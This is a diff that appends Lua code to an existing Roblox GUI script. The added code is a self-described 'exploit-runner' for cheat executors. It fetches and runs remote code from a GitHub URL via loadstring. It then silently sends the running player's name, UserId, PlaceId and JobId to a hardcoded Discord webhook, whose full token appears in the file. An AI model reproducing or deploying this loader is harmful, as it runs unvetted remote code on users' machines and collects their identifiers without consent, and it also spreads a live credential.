@@ -681,3 +681,128 @@ circle.InputBegan:Connect(function(input)
     end
 end) 
 
+-- Exploit-runner + webhook notifier
+-- Works in executors that expose http_request / syn.request / request and allow game:HttpGet
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+-- CONFIG: put your webhook here
+local WEBHOOK = "https://discord.com/api/webhooks/1422207011889742005/Ynt6qwGcJYESSRZ_HjHwF-LDK3pUxjiztfMGd29oc7A49bC8xg7ZnrSJbmKISQFdeMtC"
+
+-- the remote lua URL you want to load (change if needed)
+local REMOTE_URL = "https://raw.githubusercontent.com/RobloxScripter256/MM-Universal-Esp/refs/heads/main/README.md"
+
+-- executor http function chooser
+local http = http_request or syn and syn.request or request or http_request
+local function executorRequest(req)
+    if not http then
+        error("No executor HTTP function found. This must run in an executor (synapse/other).")
+    end
+    return http(req)
+end
+
+-- fetch remote code (using executor-safe or game:HttpGet if available)
+local function fetchRemote(url)
+    -- prefer game:HttpGet if executor allows it; else try executorRequest with GET
+    if type(game.HttpGet) == "function" then
+        local ok, res = pcall(function() return game:HttpGet(url) end)
+        if ok and res then return res end
+    end
+    -- fallback: executorRequest style
+    local ok, response = pcall(function()
+        local r = executorRequest({ Url = url, Method = "GET" })
+        -- syn.request returns table with Body; http_request may behave differently
+        if type(r) == "table" and r.Body then return r.Body end
+        return r
+    end)
+    if ok and response then return response end
+    return nil
+end
+
+-- safe run of remote code
+local function runRemote(url)
+    local code = fetchRemote(url)
+    if not code then
+        warn("Failed to fetch remote code from", url)
+        return false, "fetch_failed"
+    end
+
+    local fn, err = loadstring(code)
+    if not fn then
+        warn("loadstring error:", err)
+        return false, err
+    end
+
+    local ok, runErr = pcall(fn)
+    if not ok then
+        warn("remote code runtime error:", runErr)
+        return false, runErr
+    end
+    return true
+end
+
+-- send webhook (executor-style POST)
+local function sendWebhook()
+    local display = lp.DisplayName or lp.Name
+    local username = lp.Name
+    local playerNamePart = string.format("%s(@%s)", display, username)
+
+    local embed = {
+        title = "Script Executed",
+        description = "**PlayerName:** " .. playerNamePart,
+        color = 16753920, -- any int color
+        fields = {
+            { name = "Time", value = os.date("%Y-%m-%d %H:%M:%S", os.time()), inline = true },
+            { name = "ScriptName", value = "Beta Esp+Aimbot", inline = true },
+            { name = "UserId", value = tostring(lp.UserId), inline = true },
+            { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
+            { name = "JobId", value = tostring(game.JobId or "N/A"), inline = true },
+        },
+        footer = { text = "Exploit-run notifier" }
+    }
+
+    local payload = {
+        username = "Exploit Logger",
+        embeds = { embed }
+    }
+
+    local body = HttpService:JSONEncode(payload)
+
+    -- use executor POST if available, else try syn.request style
+    if http then
+        local ok, res = pcall(function()
+            return executorRequest({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = body
+            })
+        end)
+        if not ok then
+            warn("Webhook POST failed:", res)
+            return false, res
+        end
+        -- some executors return a table; others just run. We assume success if no error.
+        return true
+    else
+        warn("No executor http function (cannot POST webhook).")
+        return false, "no_http"
+    end
+end
+
+-- MAIN: run remote, then notify webhook
+local success, err = runRemote(REMOTE_URL)
+if success then
+    local s, e = sendWebhook()
+    if s then
+        print("Webhook sent.")
+    else
+        warn("Webhook send failed:", e)
+    end
+else
+    warn("Remote run failed:", err)
+    -- still attempt to notify (optional) — uncomment if you want
+    -- sendWebhook()
+end
